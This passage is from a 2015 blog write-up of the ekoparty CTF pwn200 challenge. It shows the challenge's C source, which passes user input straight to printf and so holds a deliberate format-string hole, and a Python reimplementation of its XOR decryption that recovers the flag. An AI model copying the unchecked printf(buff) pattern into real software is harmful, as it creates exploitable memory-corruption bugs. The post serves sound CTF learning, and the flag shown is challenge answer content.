</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">len_key</span><span class="p">]);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">out</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">num</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bye!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">process</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">13</span><span class="p">];</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;&lt;Simple loop greetings v1.3.3.7&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;[!] Type bye to quit&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">alarm</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter your name: &quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">));</span>
</span><span class='line'>        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="s">&quot;bye&quot;</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bye!&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="s">&quot;%n&quot;</span><span class="p">)</span> <span class="o">||</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="s">&quot;%N&quot;</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="c1">//p: %s\n&quot;, buff);</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hi &quot;</span><span class="p">);</span><span class="n">printf</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&quot;Welcome to ekoparty 2015!&quot;</span><span class="p">,</span> <span class="n">buff</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OMG! nice work, your flag is: &quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="kt">char</span> <span class="o">*</span><span class="n">fmt_</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">mkey</span><span class="p">);</span>
</span><span class='line'>            <span class="kt">char</span> <span class="o">*</span><span class="n">flag_</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">mkey</span><span class="p">);</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="n">fmt_</span><span class="p">,</span> <span class="n">flag_</span><span class="p">);</span>
</span><span class='line'>            <span class="n">free</span><span class="p">(</span><span class="n">fmt_</span><span class="p">);</span>
</span><span class='line'>            <span class="n">free</span><span class="p">(</span><span class="n">flag_</span><span class="p">);</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//gcc -m32 Wl,-Ttext-segment=0x13370000 -o greetings fmt_001.c ; strip greetings</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">signal</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">handler</span><span class="p">);</span>
</span><span class='line'>    <span class="n">mkey</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">mkey_crypt</span><span class="p">,</span> <span class="s">&quot;3k0_p4rty_2015!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">process</span><span class="p">();</span>
</span><span class='line'>    <span class="n">free</span><span class="p">(</span><span class="n">mkey</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Spot the mistake!</p>

<p>Found it? Yeah:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len_msg</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len_msg</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks. Anyway, we reimplemented this file in Python (honestly couldn&rsquo;t get the C program to run without segfaulting, bleh).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span><span class='line'>  <span class="n">out</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span>
</span><span class='line'>      <span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>      
</span><span class='line'>  <span class="k">return</span> <span class="n">out</span>
</span><span class='line'>  
</span><span class='line'>
</span><span class='line'><span class="n">mkey</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;3k0_p4rty_2015!&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x71\x73\x27\x1f\x1d\x48\x47</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">mkey</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">mkey</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which <em>finally</em> gave us the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">EKO</span><span class="p">{</span>\<span class="o">%</span><span class="n">s</span><span class="p">}</span>
</span><span class='line'><span class="n">b4by_3xpl0it_FMT_str1ng_FTW</span><span class="err">!</span><span class="c">#$</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>EKO{b4by_3xpl0it_FMT_str1ng_FTW!#$}</code>. Too bad the challenge was broken, nice to learn a new technique!</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>

      




<time class='entry-date' datetime='2015-09-21T23:47:44+02:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>11:47 pm</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/binary/'>binary</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/pwn/'>pwn</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/08/18/camp-ctf-dkm/" title="Previous Post: CAMP CTF - dkm">&laquo; CAMP CTF - dkm</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/09/21/ekoparty-cry100/" title="Next Post: ekoparty - cry100">ekoparty - cry100 &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/10/04/lord-of-the-root/">Lord of the Root</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/22/csaw-2015-pwn250/">CSAW 2015 - Pwn250</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/21/ekoparty-cry100/">Ekoparty - Cry100</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/21/ekoparty-pwn200/">Ekoparty - Pwn200</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/18/camp-ctf-dkm/">CAMP CTF - Dkm</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - barrebas -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'barrebas';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/';
        var disqus_url = 'http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
